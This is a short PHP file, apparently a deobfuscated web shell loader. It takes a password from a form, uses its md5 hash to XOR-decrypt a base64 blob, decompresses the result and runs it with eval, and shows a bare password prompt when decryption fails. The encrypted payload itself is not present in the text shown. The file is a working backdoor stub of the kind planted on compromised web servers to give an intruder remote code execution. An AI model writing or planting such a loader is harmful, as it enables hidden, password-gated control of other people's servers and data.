<?php
/* Decoded by unphp.net */

$pl = @strlen($pass = isset($_POST['pass'])
    ? md5($_POST['pass'])
    : (isset($_POST['hash']) ? $_POST['hash'] : md5(''))
);

$l = @strlen($d = base64_decode($d));

for ($n = 0; $n < $l; ++$n) {
    $d[$n] = chr(ord($d[$n]) ^ ord($pass[$n % $pl]));
}

if ($d = @gzuncompress($d)) {
    eval("?>$d<?");
} else {
    ?>
<html>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
        <title>Password</title>
    </head>

    <body>
        <center>
            <form method="POST"><input type="password" name="pass" /><input type="submit" /></form>
        </center>
    </body>

</html>
<?php
}
